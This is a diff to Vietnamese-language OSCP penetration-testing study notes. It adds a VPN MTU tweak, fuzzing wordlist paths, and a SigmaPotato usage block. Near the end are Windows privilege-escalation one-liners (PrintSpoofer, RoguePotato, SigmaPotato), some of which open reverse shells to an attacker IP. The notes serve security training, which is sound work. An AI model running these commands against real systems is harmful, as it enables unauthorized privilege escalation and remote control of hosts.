@@ -1,5 +1,11 @@
 OSCP Notes
 
+```
+sudo ifconfig tun0 mtu 950
+
+```
+
+
 # 1. Active Reconnaissance
 
 Active Reconnaissance là giai đoạn kiểm thử thâm nhập nơi bạn tương tác trực tiếp với mục tiêu để thu thập thông tin về cơ sở hạ tầng, dịch vụ, và các lỗ hổng tiềm ẩn. Đây là bước quan trọng giúp xác định bề mặt tấn công và các vector tấn công tiềm năng cho các giai đoạn sau.
@@ -780,6 +786,12 @@ ffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ -timeout 5
 
 # Quét các API endpoint với header JSON
 ffuf -w /path/to/api-endpoints.txt -u https://target.com/api/FUZZ -H "Content-Type: application/json" -X POST -d '{"key":"value"}'
+
+# Quet1 Param
+/usr/share/seclists/Discovery/Web-Content/raft-large-parameters.txt
+
+# API Param
+/usr/share/seclists/Discovery/Web-Content/api/api-parameters.txt
 ```
 
 ## 2.2. Technology Stack Identification
@@ -2423,6 +2435,12 @@ PrintSpoofer.exe -i -c "C:\path\to\reverse_shell.exe"
 **RoguePotato** (Windows 10/Server 2019)
 ```cmd
 RoguePotato.exe -r <attacker_ip> -e "C:\path\to\reverse_shell.exe" -l 9999
+```
+
+**SigmaPotato** (Windows 10/Server 2019)
+```cmd
+SigmaPotato.exe <cmd>
+SigmaPotato.exe --revshell <ip> <port>
 ```
 
 #### 4.3.5. Registry Exploits
